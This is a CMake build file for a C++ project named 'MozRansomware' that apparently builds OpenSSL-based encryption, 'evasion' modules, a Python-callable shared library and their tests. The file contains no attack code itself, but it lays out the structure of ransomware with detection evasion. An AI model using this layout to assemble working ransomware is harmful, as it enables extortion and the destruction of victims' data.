cmake_minimum_required(VERSION 3.14)
project(MozRansomware VERSION 2.0 LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_EXPORT_COMPILE_COMMANDS ON)
set(CMAKE_POSITION_INDEPENDENT_CODE ON)

# Include directories
include_directories(${CMAKE_SOURCE_DIR}/include)

# Find OpenSSL
find_package(OpenSSL REQUIRED)

# Static library for testing
add_library(moz_crypto STATIC src/moz_crypto.cpp)
target_include_directories(moz_crypto PUBLIC ${CMAKE_SOURCE_DIR}/include)
target_link_libraries(moz_crypto OpenSSL::Crypto OpenSSL::SSL)

# Evasion module
add_library(moz_evasion STATIC src/moz_evasion.cpp)
target_include_directories(moz_evasion PUBLIC ${CMAKE_SOURCE_DIR}/include)
target_link_libraries(moz_evasion)

# Shared library (for Python ctypes bridge)
add_library(moz_core SHARED 
    src/moz_crypto.cpp
    src/moz_evasion.cpp
    src/moz_c_api.cpp
)
target_include_directories(moz_core PUBLIC ${CMAKE_SOURCE_DIR}/include)
target_link_libraries(moz_core moz_crypto moz_evasion OpenSSL::Crypto OpenSSL::SSL)

# Create test executables
add_executable(moz_test tests/test_crypto.cpp)
target_link_libraries(moz_test moz_crypto moz_evasion OpenSSL::Crypto OpenSSL::SSL)

add_executable(moz_evasion_test tests/test_evasion.cpp)
target_link_libraries(moz_evasion_test moz_crypto moz_evasion OpenSSL::Crypto OpenSSL::SSL)
